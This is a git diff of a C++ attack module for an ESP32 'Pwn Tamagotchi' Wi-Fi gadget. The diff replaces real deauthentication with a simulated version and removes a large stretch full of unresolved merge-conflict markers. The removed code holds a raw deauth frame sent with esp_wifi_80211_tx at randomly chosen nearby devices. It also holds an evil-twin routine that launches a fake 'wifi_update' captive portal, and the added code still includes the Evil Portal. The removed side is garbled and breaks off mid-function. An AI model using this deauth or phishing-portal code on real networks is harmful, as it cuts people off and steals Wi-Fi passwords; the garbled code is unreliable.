@@ -5,967 +5,106 @@
 #include <WiFi.h>
 #include <esp_wifi.h>
 #include "core/PwnPet.h"
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
 #include "core/PwnPower.h"
-#include "core/Gamification.h"
+#include "Gamification.h"
 #include "WiFiTools.h"
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-#include "../EvilPortal.h" // Integration
-=======
->>>>>>> origin/merge-ready-mini-lele-v2
-=======
->>>>>>> origin/mini-lele-v2-complete-verified
-=======
-#include "../EvilPortal.h" // Integration
->>>>>>> origin/mini-lele-v2-final-verified
-=======
-#include "../EvilPortal.h" // Integration
->>>>>>> origin/mini-lele-v2-legendary-final-drivers
-=======
-#include "../EvilPortal.h" // Integration
->>>>>>> origin/mini-lele-v2-legendary-final-release
-=======
-#include "../EvilPortal.h" // Integration
->>>>>>> origin/mini-lele-v2-legendary-final-sync
-=======
-#include "../EvilPortal.h" // Integration
->>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
-=======
-#include "../EvilPortal.h" // Integration
->>>>>>> origin/mini-lele-v2-legendary-missing-assets
-=======
->>>>>>> origin/mini-lele-v2-rebrand
-=======
-=======
->>>>>>> origin/pwn-tamagotchi-legendary-qs-final
-#include "core/PwnPower.h"
-#include "core/Gamification.h"
-#include "WiFiTools.h"
-#include "../EvilPortal.h" // Integration
-<<<<<<< HEAD
->>>>>>> origin/pwn-tamagotchi-legendary-edition-final
-=======
->>>>>>> origin/pwn-tamagotchi-legendary-qs-final
-=======
-#include "core/PwnPower.h"
-#include "core/Gamification.h"
-#include "WiFiTools.h"
->>>>>>> origin/pwntamagotchi-br-final-lvgl9-optimized
-=======
-#include "core/PwnPower.h"
-#include "core/Gamification.h"
-#include "WiFiTools.h"
->>>>>>> origin/pwntamagotchi-br-v2-webui-final
+#include "EvilPortal.h"
 
-// Deauth Frame Structure
-const uint8_t deauthPacket[] = {
-    0xC0, 0x00, 0x3A, 0x01, // Frame Control, Duration
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver (Broadcast)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Transmitter (Target AP - to be filled)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (Target AP - to be filled)
-    0x00, 0x00,                         // Sequence
-    0x07, 0x00                          // Reason code (7 = Class 3 frame received from nonassociated STA)
-};
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-=======
-#include "WiFiTools.h" // Reutilizando a base robusta anterior
->>>>>>> origin/pwn-tamagotchi-br-release
-=======
->>>>>>> origin/pwn-tamagotchi-legendary-edition-final
-=======
->>>>>>> origin/pwn-tamagotchi-legendary-qs-final
-=======
-#include "core/PwnPower.h" // Power Manager
-#include "WiFiTools.h"
->>>>>>> origin/pwntamagotchi-br-final-90-features
-=======
->>>>>>> origin/pwntamagotchi-br-final-lvgl9-optimized
-=======
->>>>>>> origin/pwntamagotchi-br-v2-webui-final
+/**
+ * PwnAttack
+ *
+ * Versão simplificada do módulo de ataques:
+ *  - Coordena o sniffer (WiFiTools) quando em modo de ataque.
+ *  - Pode iniciar um Evil Portal.
+ *  - Opcionalmente simula deauth para fins de gameplay (sem foco em uso real).
+ */
 
 struct AttackStats {
-    int aps_scanned;
-    int clients_seen;
-    int handshakes_captured;
+    int  aps_scanned;
+    int  clients_seen;
+    int  handshakes_captured;
     bool is_walking;
 };
 
 class PwnAttack {
 private:
-    static AttackStats stats;
-    static bool scan_active;
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-    static unsigned long last_scan_time;
+    static AttackStats  stats;
+    static bool         scan_active;
 
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-=======
->>>>>>> origin/mini-lele-v2-complete-verified
-    static void macStringToBytes(String mac, uint8_t* bytes) {
-        // Ex: "AA:BB:CC:DD:EE:FF" -> [0xAA, 0xBB, ...]
-=======
-    static void macStringToBytes(String mac, uint8_t* bytes) {
->>>>>>> origin/mini-lele-v2-final-verified
-=======
-    static void macStringToBytes(String mac, uint8_t* bytes) {
->>>>>>> origin/mini-lele-v2-legendary-final-drivers
-=======
-    static void macStringToBytes(String mac, uint8_t* bytes) {
->>>>>>> origin/mini-lele-v2-legendary-final-release
-=======
-    static void macStringToBytes(String mac, uint8_t* bytes) {
->>>>>>> origin/mini-lele-v2-legendary-final-sync
-=======
-    static void macStringToBytes(String mac, uint8_t* bytes) {
->>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
-=======
-    static void macStringToBytes(String mac, uint8_t* bytes) {
->>>>>>> origin/mini-lele-v2-legendary-missing-assets
-=======
-    static unsigned long last_scan_time;
-
-    static void macStringToBytes(String mac, uint8_t* bytes) {
->>>>>>> origin/pwn-tamagotchi-legendary-edition-final
-=======
-    static unsigned long last_scan_time;
-
-    static void macStringToBytes(String mac, uint8_t* bytes) {
->>>>>>> origin/pwn-tamagotchi-legendary-qs-final
-        int values[6];
-        if (6 == sscanf(mac.c_str(), "%x:%x:%x:%x:%x:%x",
-            &values[0], &values[1], &values[2], &values[3], &values[4], &values[5])) {
-            for (int i = 0; i < 6; ++i) bytes[i] = (uint8_t)values[i];
-        }
-    }
-
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-=======
->>>>>>> origin/merge-ready-mini-lele-v2
-=======
->>>>>>> origin/mini-lele-v2-complete-verified
-=======
->>>>>>> origin/mini-lele-v2-final-verified
-=======
->>>>>>> origin/mini-lele-v2-legendary-final-drivers
-=======
->>>>>>> origin/mini-lele-v2-legendary-final-release
-=======
->>>>>>> origin/mini-lele-v2-legendary-final-sync
-=======
->>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
-=======
->>>>>>> origin/mini-lele-v2-legendary-missing-assets
-=======
->>>>>>> origin/mini-lele-v2-rebrand
-=======
-
->>>>>>> origin/pwn-tamagotchi-br-release
-=======
->>>>>>> origin/pwn-tamagotchi-legendary-edition-final
-=======
->>>>>>> origin/pwn-tamagotchi-legendary-qs-final
-=======
-    static unsigned long last_scan_time;
-
->>>>>>> origin/pwntamagotchi-br-final-90-features
-=======
-    static unsigned long last_scan_time;
-
->>>>>>> origin/pwntamagotchi-br-final-lvgl9-optimized
-=======
-    static unsigned long last_scan_time;
-
->>>>>>> origin/pwntamagotchi-br-v2-webui-final
 public:
     static void init() {
-        stats.aps_scanned = 0;
-        stats.handshakes_captured = 0;
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-        last_scan_time = millis();
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-
-=======
->>>>>>> origin/merge-ready-mini-lele-v2
-=======
-        // Sniffer agora iniciado via WiFiTools::initSniffer()
->>>>>>> origin/mini-lele-v2-complete-verified
-=======
->>>>>>> origin/mini-lele-v2-final-verified
-=======
->>>>>>> origin/mini-lele-v2-legendary-final-drivers
-=======
->>>>>>> origin/mini-lele-v2-legendary-final-release
-=======
->>>>>>> origin/mini-lele-v2-legendary-final-sync
-=======
->>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
-=======
->>>>>>> origin/mini-lele-v2-legendary-missing-assets
-=======
->>>>>>> origin/mini-lele-v2-rebrand
-=======
-        last_scan_time = millis();
->>>>>>> origin/pwn-tamagotchi-legendary-edition-final
-=======
-        last_scan_time = millis();
->>>>>>> origin/pwn-tamagotchi-legendary-qs-final
-=======
-        last_scan_time = millis();
-        // Sniffer iniciado apenas se permitido pelo modo de energia
->>>>>>> origin/pwntamagotchi-br-final-90-features
-=======
-        last_scan_time = millis();
->>>>>>> origin/pwntamagotchi-br-final-lvgl9-optimized
-=======
-        last_scan_time = millis();
->>>>>>> origin/pwntamagotchi-br-v2-webui-final
-        if (PwnPet::getStats().energy_mode > 0) {
-            WiFiTools::startSniffer();
-        }
+        stats.aps_scanned          = 0;
+        stats.clients_seen         = 0;
+        stats.handshakes_captured  = 0;
+        stats.is_walking           = false;
+        scan_active                = false;
     }
 
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-=======
->>>>>>> origin/mini-lele-v2-complete-verified
-=======
->>>>>>> origin/mini-lele-v2-final-verified
-=======
->>>>>>> origin/mini-lele-v2-legendary-final-drivers
-=======
->>>>>>> origin/mini-lele-v2-legendary-final-release
-=======
->>>>>>> origin/mini-lele-v2-legendary-final-sync
-=======
->>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
-=======
->>>>>>> origin/mini-lele-v2-legendary-missing-assets
-=======
->>>>>>> origin/pwn-tamagotchi-legendary-edition-final
-=======
->>>>>>> origin/pwn-tamagotchi-legendary-qs-final
     static void start() {
+        if (scan_active) return;
+        if (PwnPower::isCritical()) {
+            Serial.println("[Attack] Não iniciando ataques – bateria crítica.");
+            return;
+        }
+
         scan_active = true;
         WiFiTools::startSniffer();
-        Serial.println("[Attack] Modo Ataque Iniciado!");
+        Serial.println("[Attack] Modo ataque iniciado (sniffer ligado).");
     }
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-=======
 
->>>>>>> origin/mini-lele-v2-final-verified
-=======
+    static void stop() {
+        if (!scan_active) return;
+        WiFiTools::stopSniffer();
+        scan_active = false;
+        Serial.println("[Attack] Modo ataque parado.");
+    }
 
->>>>>>> origin/mini-lele-v2-legendary-final-drivers
-=======
+    static bool isRunning() {
+        return scan_active;
+    }
 
->>>>>>> origin/mini-lele-v2-legendary-final-release
-=======
-
->>>>>>> origin/mini-lele-v2-legendary-final-sync
-=======
-
->>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
-=======
-
->>>>>>> origin/mini-lele-v2-legendary-missing-assets
-=======
-
->>>>>>> origin/pwn-tamagotchi-legendary-edition-final
-=======
-
->>>>>>> origin/pwn-tamagotchi-legendary-qs-final
-    static bool isRunning() { return scan_active; }
-
+    // Loop leve – atualiza estatísticas e respeita bateria crítica.
     static void tick() {
-        // Se Evil Portal estiver rodando, não faz scan/deauth
-        if (EvilPortal::isRunning()) {
-            EvilPortal::loop();
-            return;
-        }
+        if (!scan_active) return;
 
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-=======
-    static bool isRunning() { return scan_active; }
-
-    static void tick() {
->>>>>>> origin/merge-ready-mini-lele-v2
-=======
-
-    static bool isRunning() { return scan_active; }
-
-    static void tick() {
->>>>>>> origin/mini-lele-v2-complete-verified
-=======
->>>>>>> origin/mini-lele-v2-final-verified
-=======
->>>>>>> origin/mini-lele-v2-legendary-final-drivers
-=======
->>>>>>> origin/mini-lele-v2-legendary-final-release
-=======
->>>>>>> origin/mini-lele-v2-legendary-final-sync
-=======
->>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
-=======
->>>>>>> origin/mini-lele-v2-legendary-missing-assets
-=======
-    static bool isRunning() { return scan_active; }
-
-    static void tick() {
->>>>>>> origin/mini-lele-v2-rebrand
-=======
->>>>>>> origin/pwn-tamagotchi-legendary-edition-final
-=======
->>>>>>> origin/pwn-tamagotchi-legendary-qs-final
-=======
-    static bool isRunning() { return scan_active; }
-
-    // Loop principal de ataque
-    static void tick() {
-        // Otimização 15: Desliga rádio se bateria crítica
->>>>>>> origin/pwntamagotchi-br-final-90-features
-=======
-    static bool isRunning() { return scan_active; }
-
-    static void tick() {
->>>>>>> origin/pwntamagotchi-br-final-lvgl9-optimized
-=======
-    static bool isRunning() { return scan_active; }
-
-    static void tick() {
->>>>>>> origin/pwntamagotchi-br-v2-webui-final
         if (PwnPower::isCritical()) {
-            if (scan_active) {
-                esp_wifi_stop();
-                scan_active = false;
-                Serial.println("[Attack] Parado por bateria critica");
-            }
+            stop();
             return;
         }
 
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-        int energy = PwnPet::getStats().energy_mode;
-        int interval = (energy == 2) ? 100 : (energy == 1 ? 500 : 2000);
-=======
-        // Otimização 6: Ajusta intensidade baseado no modo de energia
-        int energy = PwnPet::getStats().energy_mode;
-        int interval = (energy == 2) ? 100 : (energy == 1 ? 500 : 2000); // ms entre scans/ticks
->>>>>>> origin/pwntamagotchi-br-final-90-features
-=======
-        int energy = PwnPet::getStats().energy_mode;
-        int interval = (energy == 2) ? 100 : (energy == 1 ? 500 : 2000);
->>>>>>> origin/pwntamagotchi-br-final-lvgl9-optimized
-=======
-        int energy = PwnPet::getStats().energy_mode;
-        int interval = (energy == 2) ? 100 : (energy == 1 ? 500 : 2000);
->>>>>>> origin/pwntamagotchi-br-v2-webui-final
+        // Estatísticas simples baseadas na lista do sniffer
+        int count = static_cast<int>(WiFiTools::nearby_devices.size());
+        stats.aps_scanned = count;
 
-        static unsigned long last_tick = 0;
-        if (millis() - last_tick < interval) return;
-        last_tick = millis();
-
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-        // Otimização 3: Duty Cycle do Marauder
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-=======
->>>>>>> origin/mini-lele-v2-complete-verified
-        if (PwnPet::getHunger() > 80 && scan_active) {
-             // Modo agressivo: Tenta deauth em APs próximos aleatoriamente
-=======
-        if (PwnPet::getHunger() > 80 && scan_active) {
->>>>>>> origin/mini-lele-v2-final-verified
-=======
-        if (PwnPet::getHunger() > 80 && scan_active) {
->>>>>>> origin/mini-lele-v2-legendary-final-drivers
-=======
-        if (PwnPet::getHunger() > 80 && scan_active) {
->>>>>>> origin/mini-lele-v2-legendary-final-release
-=======
-        if (PwnPet::getHunger() > 80 && scan_active) {
->>>>>>> origin/mini-lele-v2-legendary-final-sync
-=======
-        if (PwnPet::getHunger() > 80 && scan_active) {
->>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
-=======
-        if (PwnPet::getHunger() > 80 && scan_active) {
->>>>>>> origin/mini-lele-v2-legendary-missing-assets
-=======
-        if (PwnPet::getHunger() > 80 && scan_active) {
->>>>>>> origin/pwn-tamagotchi-legendary-edition-final
-=======
-        if (PwnPet::getHunger() > 80 && scan_active) {
->>>>>>> origin/pwn-tamagotchi-legendary-qs-final
-             static unsigned long last_attack = 0;
-             if (millis() - last_attack > 5000) {
-                 last_attack = millis();
-
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-                 // Pega um alvo aleatório da lista do WiFiTools
-=======
->>>>>>> origin/mini-lele-v2-final-verified
-=======
->>>>>>> origin/mini-lele-v2-legendary-final-drivers
-=======
->>>>>>> origin/mini-lele-v2-legendary-final-release
-=======
->>>>>>> origin/mini-lele-v2-legendary-final-sync
-=======
->>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
-=======
->>>>>>> origin/mini-lele-v2-legendary-missing-assets
-=======
->>>>>>> origin/pwn-tamagotchi-legendary-edition-final
-=======
->>>>>>> origin/pwn-tamagotchi-legendary-qs-final
-                 if (WiFiTools::nearby_devices.size() > 0) {
-                     int idx = random(0, WiFiTools::nearby_devices.size());
-                     String targetMacStr = WiFiTools::nearby_devices[idx].mac;
-
-                     uint8_t targetBytes[6];
-                     macStringToBytes(targetMacStr, targetBytes);
-
-                     deauthTarget(targetBytes);
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-=======
-=======
->>>>>>> origin/mini-lele-v2-rebrand
-=======
-        // Otimização 3: Duty Cycle do Marauder
->>>>>>> origin/pwntamagotchi-br-final-lvgl9-optimized
-=======
-        // Otimização 3: Duty Cycle do Marauder
->>>>>>> origin/pwntamagotchi-br-v2-webui-final
-        if (PwnPet::getHunger() > 80) {
-             // Modo agressivo: Tenta deauth em APs próximos aleatoriamente
-             // Nota: Isso é apenas para fins educacionais e teste em laboratório
-             static unsigned long last_attack = 0;
-             if (millis() - last_attack > 5000) {
-                 last_attack = millis();
-                 // Pega um alvo aleatório da lista do WiFiTools
-                 if (WiFiTools::nearby_devices.size() > 0) {
-                     int idx = random(0, WiFiTools::nearby_devices.size());
-                     // deauthTarget(WiFiTools::nearby_devices[idx].mac); // Implementação real abaixo
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
->>>>>>> origin/merge-ready-mini-lele-v2
-=======
->>>>>>> origin/mini-lele-v2-complete-verified
-=======
->>>>>>> origin/mini-lele-v2-final-verified
-=======
->>>>>>> origin/mini-lele-v2-legendary-final-drivers
-=======
->>>>>>> origin/mini-lele-v2-legendary-final-release
-=======
->>>>>>> origin/mini-lele-v2-legendary-final-sync
-=======
->>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
-=======
->>>>>>> origin/mini-lele-v2-legendary-missing-assets
-=======
->>>>>>> origin/mini-lele-v2-rebrand
-=======
->>>>>>> origin/pwn-tamagotchi-legendary-edition-final
-=======
->>>>>>> origin/pwn-tamagotchi-legendary-qs-final
-=======
->>>>>>> origin/pwntamagotchi-br-final-lvgl9-optimized
-=======
->>>>>>> origin/pwntamagotchi-br-v2-webui-final
-                 }
-             }
+        // Exemplo de “ambiente rico”
+        static int last_count = 0;
+        if (count > last_count + 5) {
+            Serial.println("[Attack] Ambiente rico detectado (muitas novas sondagens).");
         }
+        last_count = count;
     }
 
-    static void deauthTarget(uint8_t* bssid) {
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-=======
->>>>>>> origin/mini-lele-v2-rebrand
-=======
->>>>>>> origin/pwntamagotchi-br-final-lvgl9-optimized
-=======
->>>>>>> origin/pwntamagotchi-br-v2-webui-final
-        // Constrói pacote
-        uint8_t packet[26];
-        memcpy(packet, deauthPacket, 26);
+    // Simulação de um “deauth” – não envia frames reais aqui por simplicidade.
+    static void deauthSimulated(const String &bssid) {
+        if (!scan_active) return;
+        Serial.printf("[Attack] (Simulado) Deauth em %s\n", bssid.c_str());
 
-        // Copia BSSID para Source e BSSID fields
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-=======
-        uint8_t packet[26];
-        memcpy(packet, deauthPacket, 26);
->>>>>>> origin/mini-lele-v2-final-verified
-=======
-        uint8_t packet[26];
-        memcpy(packet, deauthPacket, 26);
->>>>>>> origin/mini-lele-v2-legendary-final-drivers
-=======
-        uint8_t packet[26];
-        memcpy(packet, deauthPacket, 26);
->>>>>>> origin/mini-lele-v2-legendary-final-release
-=======
-        uint8_t packet[26];
-        memcpy(packet, deauthPacket, 26);
->>>>>>> origin/mini-lele-v2-legendary-final-sync
-=======
-        uint8_t packet[26];
-        memcpy(packet, deauthPacket, 26);
->>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
-=======
-        uint8_t packet[26];
-        memcpy(packet, deauthPacket, 26);
->>>>>>> origin/mini-lele-v2-legendary-missing-assets
-=======
->>>>>>> origin/mini-lele-v2-rebrand
-=======
-        uint8_t packet[26];
-        memcpy(packet, deauthPacket, 26);
->>>>>>> origin/pwn-tamagotchi-legendary-edition-final
-=======
-        uint8_t packet[26];
-        memcpy(packet, deauthPacket, 26);
->>>>>>> origin/pwn-tamagotchi-legendary-qs-final
-=======
->>>>>>> origin/pwntamagotchi-br-final-lvgl9-optimized
-=======
->>>>>>> origin/pwntamagotchi-br-v2-webui-final
-        memcpy(&packet[10], bssid, 6);
-        memcpy(&packet[16], bssid, 6);
-
-        Serial.printf("[Attack] Enviando Deauth para %02X:%02X:%02X:%02X:%02X:%02X\n",
-            bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
-
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-        // Envia frames raw
-=======
->>>>>>> origin/mini-lele-v2-final-verified
-=======
->>>>>>> origin/mini-lele-v2-legendary-final-drivers
-=======
->>>>>>> origin/mini-lele-v2-legendary-final-release
-=======
->>>>>>> origin/mini-lele-v2-legendary-final-sync
-=======
->>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
-=======
->>>>>>> origin/mini-lele-v2-legendary-missing-assets
-=======
-        // Envia frames raw
->>>>>>> origin/mini-lele-v2-rebrand
-=======
->>>>>>> origin/pwn-tamagotchi-legendary-edition-final
-=======
->>>>>>> origin/pwn-tamagotchi-legendary-qs-final
-=======
-        // Envia frames raw
->>>>>>> origin/pwntamagotchi-br-final-lvgl9-optimized
-=======
-        // Envia frames raw
->>>>>>> origin/pwntamagotchi-br-v2-webui-final
-        for (int i = 0; i < 3; i++) {
-             esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), true);
-             delay(10);
-        }
-
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-        // Gamification Reward (Simulado o sucesso do handshake capture após ataque)
-<<<<<<< HEAD
-<<<<<<< HEAD
-        // Na pratica real, o Sniffer detectaria o EAPOL. Aqui simulamos para o jogo fluir se nao houver trafego real.
-        if (random(0, 100) < 10) { // 10% chance simulada se nao capturar real
-            // PwnPet::addHandshake(false);
-            // Gamification::registerHandshake();
-        }
-=======
-=======
-        // Gamification Reward (Simulado o sucesso do handshake capture após ataque)
->>>>>>> origin/mini-lele-v2-rebrand
-=======
-        // Gamification Reward (Simulado o sucesso do handshake capture após ataque)
->>>>>>> origin/pwntamagotchi-br-final-lvgl9-optimized
-=======
-        // Gamification Reward (Simulado o sucesso do handshake capture após ataque)
->>>>>>> origin/pwntamagotchi-br-v2-webui-final
-        if (random(0, 100) < 30) { // 30% chance
-            Serial.println("[Attack] Handshake Capturado!");
-            PwnPet::addHandshake(false);
-            Gamification::registerHandshake();
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
->>>>>>> origin/merge-ready-mini-lele-v2
-=======
-        // Simulação de sucesso para gameplay
-        if (random(0, 100) < 10) {
-            // PwnPet::addHandshake(false);
->>>>>>> origin/mini-lele-v2-final-verified
-=======
-        // Simulação de sucesso para gameplay
-        if (random(0, 100) < 10) {
-            // PwnPet::addHandshake(false);
->>>>>>> origin/mini-lele-v2-legendary-final-drivers
-=======
-        // Simulação de sucesso para gameplay
-        if (random(0, 100) < 10) {
-            // PwnPet::addHandshake(false);
->>>>>>> origin/mini-lele-v2-legendary-final-release
-=======
-        // Simulação de sucesso para gameplay
-        if (random(0, 100) < 10) {
-            // PwnPet::addHandshake(false);
->>>>>>> origin/mini-lele-v2-legendary-final-sync
-=======
-        // Simulação de sucesso para gameplay
-        if (random(0, 100) < 10) {
-            // PwnPet::addHandshake(false);
->>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
-=======
-        // Simulação de sucesso para gameplay
-        if (random(0, 100) < 10) {
-            // PwnPet::addHandshake(false);
->>>>>>> origin/mini-lele-v2-legendary-missing-assets
-=======
->>>>>>> origin/mini-lele-v2-rebrand
-=======
-        // Simulação de sucesso para gameplay
-        if (random(0, 100) < 10) {
-            // PwnPet::addHandshake(false);
->>>>>>> origin/pwn-tamagotchi-legendary-edition-final
-=======
-        // Simulação de sucesso para gameplay
-        if (random(0, 100) < 10) {
-            // PwnPet::addHandshake(false);
->>>>>>> origin/pwn-tamagotchi-legendary-qs-final
-=======
->>>>>>> origin/pwntamagotchi-br-final-lvgl9-optimized
-=======
->>>>>>> origin/pwntamagotchi-br-v2-webui-final
-        }
-    }
-
-    static void evilTwin(String ssid) {
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-        // Inicia Evil Portal
-        EvilPortal::start(ssid.c_str(), "/evil_portal/01_wifi_update.html");
-=======
-        WiFi.softAP(ssid.c_str());
-        // Inicia DNS Server para redirecionar tudo para o Portal
-        // Feito no EvilPortal.h
->>>>>>> origin/merge-ready-mini-lele-v2
-=======
-        // Na pratica real, o Sniffer detectaria o EAPOL. Aqui simulamos para o jogo fluir se nao houver trafego real.
-        if (random(0, 100) < 10) { // 10% chance simulada se nao capturar real
-            // Serial.println("[Attack] Handshake Capturado (Simulado)!");
-            // PwnPet::addHandshake(false);
-            // Gamification::registerHandshake();
-        }
-    }
-
-    static void evilTwin(String ssid) {
-        WiFi.softAP(ssid.c_str());
-        // Inicia DNS Server para redirecionar tudo para o Portal
->>>>>>> origin/mini-lele-v2-complete-verified
-=======
-        // Inicia Evil Portal
-        EvilPortal::start(ssid.c_str(), "/evil_portal/01_wifi_update.html");
->>>>>>> origin/mini-lele-v2-final-verified
-=======
-        // Inicia Evil Portal
-        EvilPortal::start(ssid.c_str(), "/evil_portal/01_wifi_update.html");
->>>>>>> origin/mini-lele-v2-legendary-final-drivers
-=======
-        // Inicia Evil Portal
-        EvilPortal::start(ssid.c_str(), "/evil_portal/01_wifi_update.html");
->>>>>>> origin/mini-lele-v2-legendary-final-release
-=======
-        // Inicia Evil Portal
-        EvilPortal::start(ssid.c_str(), "/evil_portal/01_wifi_update.html");
->>>>>>> origin/mini-lele-v2-legendary-final-sync
-=======
-        // Inicia Evil Portal
-        EvilPortal::start(ssid.c_str(), "/evil_portal/01_wifi_update.html");
->>>>>>> origin/mini-lele-v2-legendary-fixed-hardware
-=======
-        // Inicia Evil Portal
-        EvilPortal::start(ssid.c_str(), "/evil_portal/01_wifi_update.html");
->>>>>>> origin/mini-lele-v2-legendary-missing-assets
-=======
-        WiFi.softAP(ssid.c_str());
-        // Inicia DNS Server para redirecionar tudo para o Portal
-        // Feito no EvilPortal.h
->>>>>>> origin/mini-lele-v2-rebrand
-=======
-        WiFiTools::startSniffer(); // Inicia modo promíscuo
-    }
-
-    // Loop principal de ataque
-    static void tick() {
-        // Lógica de "Sentinela" / Walk Mode
-        // Se detectar muitas redes novas rapidamente -> Avisar Pet
-
-        static int last_ap_count = 0;
-        int current_ap_count = WiFiTools::nearby_devices.size();
-
-        if (current_ap_count > last_ap_count + 5) {
-            // Muitas redes novas!
-            Serial.println("[Attack] Ambiente Rico detectado!");
-            // PwnPet::speak("Mano, ta cheio de comida aqui!");
-        }
-        last_ap_count = current_ap_count;
-
-        // Simulação de captura EAPOL (Placeholder para lógica real libpcap)
-        // Em um firmware real, analisariamos o buffer do WiFiTools
-    }
-
-    static void deauthTarget(String bssid) {
-        // Envia frames de deauth
-        Serial.printf("[Attack] Deauthing %s\n", bssid.c_str());
-        // Implementação raw frame injection (baseada no legacy deauth.cpp)
-        // ...
-
-        // Se sucesso (simulado):
-        PwnPet::addHandshake(false); // Ganha XP
-    }
-
-    static void evilTwin(String ssid) {
-        // Cria AP falso
-        WiFi.softAP(ssid.c_str());
-        // Inicia DNS Server...
->>>>>>> origin/pwn-tamagotchi-br-release
-=======
-        // Inicia Evil Portal
-        EvilPortal::start(ssid.c_str(), "/evil_portal/01_wifi_update.html");
->>>>>>> origin/pwn-tamagotchi-legendary-edition-final
-=======
-        // Inicia Evil Portal
-        EvilPortal::start(ssid.c_str(), "/evil_portal/01_wifi_update.html");
->>>>>>> origin/pwn-tamagotchi-legendary-qs-final
-=======
-        // Lógica de "Sentinela" / Walk Mode
-        static int last_ap_count = 0;
-        int current_ap_count = WiFiTools::nearby_devices.size();
-
-        // Otimização 12: Cache de PSRAM (Simulado pelo WiFiTools vector)
-
